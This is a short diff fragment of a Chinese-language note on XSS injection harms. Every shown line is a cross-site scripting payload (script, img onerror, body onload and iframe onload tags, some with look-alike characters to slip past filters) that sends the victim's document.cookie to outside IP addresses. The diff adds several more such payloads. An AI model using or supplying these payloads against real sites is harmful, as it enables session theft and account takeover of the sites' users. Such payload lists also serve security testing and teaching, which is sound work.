@@ -23,4 +23,11 @@ XSS注入在线脚本危害：
 
 <script>location.href="http://1.92.88.247/cookie/cookie.php?cookie="+document.cookie</script>
 <img src="" οnerrοr=location.href="http://47.98.193.145/1.php?cookie="+document.cookie>
+
+<body οnlοad=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie>
+<body onload="document.location.href='http://47.98.193.145/1111/127.php?1='+document.cookie"></body>
+<body onload="document.location.href='http://47.98.193.145/1111/127.php?1='+document.cookie">
+
+<iframe οnlοad=document.location='http://47.98.193.145:1470/?cookie='+document.cookie>
+
 ```
